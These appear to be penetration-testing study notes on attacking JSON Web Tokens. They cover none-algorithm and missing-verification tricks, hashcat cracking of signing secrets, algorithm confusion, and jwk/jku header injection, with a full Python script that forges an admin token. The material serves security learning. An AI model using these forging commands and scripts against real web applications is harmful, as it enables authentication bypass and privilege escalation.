# JSON Web Token Attacks

- A JSON Web Token (JWT) is a way of formatting data (or claims) for transfer between multiple parties.
- It can utilize either JSON Web Signature (JWS) or JSON Web Encryption (JWE) for protecting the data contained within the JWT.
- JWS is most commonly used in web applications.
- Two standards comprise JWTs. 
    - JSON Web Key (JWK) : defines a JSON data structure for cryptographic keys.
    - JSON Web Algorithm (JWA) : defines cryptographic algorithms for JWTs.
- JWT has 3 parts:
    - Header: Algorithm and type.
    - Payload: Actual data like username, role etc. This data comprises multiple claims.
    - Signature: Signature to ensure integrity of JWT.


### Missing Signature Verification

- Just manipulate the token from sites like [JWT Editor](https://jwt.lannysport.net/). If the signature verification is not implemented, you will be able to do whatever you want.

### None Algorithm Attack

- Change `alg-claim` in the JWT's header to `none`.
- This implies that JWT doesnot contain a signature, and the web application should accept it without computing one.

> In this case the JWT does not contain a signature, the final period (.) still needs to be present.

```shell
python3 jwt_tool.py -X a -pc <param> -pv <param_value> -I <jwt>
```

### Attacking the Signing Secret

- Brute force the signing secret and modify the token.

```shell
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Algorithm Confusion

- Algorithm confusion attack forces the web application to use a different algorithm to verify the JWT's signature than the one used to create it.
- This attack only works if the web application uses the algorithm specified in the alg-claim of the JWT to determine the algorithm for signature verification.
- If the web application uses an `asymmetric` algorithm such as `RS256`, a private key is used to compute the signaturea and a public key is used to verify the signature. A `different` key is used for signing and verification.
- If we create a token that uses a `symmetric` algorithm such as `HS256`, the token's signature can be verified with the `same` key used to sign the JWT. Since the web application uses the public key for verification, it will accept any symmetric JWTs signed with this key. As the name suggests, this key is public, enabling us to forge a valid JWT by signing it with the web application's public key.

```shell
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
docker build . -t sig2n
docker run -it sig2n /bin/bash

python3 jwt_forgery.py <token>
```

> The tool may compute multiple public key candidates. To reduce the number of candidates, we can rerun it with different JWTs captured from the web application. Additionally, the tool automatically creates symmetric JWTs signed with the computed public key in different formats. We can use these JWTs to test for an algorithm confusion vulnerability.

- We can use CyberChef to forge our JWT by selecting the JWT Sign operation. We must set the Signing algorithm to HS256 and paste the public key into the Private/Secret key field (`x509.pem` file). Additionally, we need to add a `newline (\n)` at the end of the public key.


### Exploiting jwk

- The jwk (JSON Web Key) Header Parameter is the public key that corresponds to the key used to digitally sign the JWS. 
This key is represented as a JSON Web Key. Use of this Header Parameter is OPTIONAL.
- jwk contains information about the public key used for key verification for asymmetric JWTs.
- If the web application is misconfigured to accept arbitrary keys provided in the jwk claim, we could forge a JWT, sign it with our own private key, and then provide the corresponding public key in the jwk claim for the web application to verify the signature and accept the JWT.

```shell
# Generate our own keys to sign the JWT
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
```

- With these keys, we need to perform the following steps:
    - Manipulate the JWT's payload to set the isAdmin claim to true
    - Manipulate the JWT's header to set the jwk claim to our public key's details
    - Sign the JWT using our private key

- Below is the code to automate this:

```python
# pip3 install pyjwt cryptography python-jose

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```

### Exploiting jku

- The "jku" (JWK Set URL) Header Parameter is a URI that refers to a resource for a set of JSON-encoded public keys,
one of which corresponds to the key used to digitally sign the JWS.
    - The keys MUST be encoded as a JWK Set. 
    - The protocol used to acquire the resource MUST provide integrity protection.
    - HTTP GET request to retrieve the JWK Set MUST use Transport Layer Security (TLS) and the identity of the server MUST be validated.
-  If a web application fails to verify this claim correctly, it can be exploited by an attacker, similar to the jwk claim. 
- The process is nearly identical; however, instead of embedding the key details into the jwk claim, the attacker hosts the key details on his web server and sets the JWT's jku claim to the corresponding URL.

> The jku claim may potentially be exploited for blind GET-based Server Side Request Forgery (SSRF) attacks.